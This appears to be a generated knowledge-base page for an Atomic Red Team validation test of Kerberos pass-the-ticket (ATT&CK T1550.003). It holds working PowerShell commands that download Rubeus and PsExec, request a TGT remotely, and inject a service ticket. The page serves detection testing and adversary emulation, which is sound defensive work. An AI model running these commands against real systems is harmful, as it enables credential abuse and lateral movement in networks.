---
atomic_guid: "a2fc4ec5-12c6-4fb4-b661-961f23f359cb"
title: "Rubeus Kerberos Pass The Ticket"
framework: "atomic"
generated: "true"
attack_technique_id: "T1550.003"
attack_technique_name: "Use Alternate Authentication Material: Pass the Ticket"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "a2fc4ec5-12c6-4fb4-b661-961f23f359cb"
  - "Rubeus Kerberos Pass The Ticket"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Rubeus Kerberos Pass The Ticket

Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.

## Metadata

- Atomic GUID: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
- Technique: T1550.003: Use Alternate Authentication Material: Pass the Ticket
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1550.003/T1550.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1550-use_alternate_authentication_material|T1550.003]]

## Input Arguments

### domain

- description: domain
- type: string
- default: $Env:USERDOMAIN

### password

- description: password for user_name
- type: string
- default: Password

### rubeus_url

- description: URL of Rubeus executable
- type: url
- default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

### target

- description: Remote system to request the TGT from
- type: string
- default: localhost

### user_name

- description: username associated with the ticket (privileged account not required)
- type: string
- default: Administrator

## Dependencies

Rubeus must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"

### Prerequisite Check

```text
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-Webrequest -Uri #{rubeus_url} -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
```

PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"

### Prerequisite Check

```text
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.003/T1550.003.yaml)
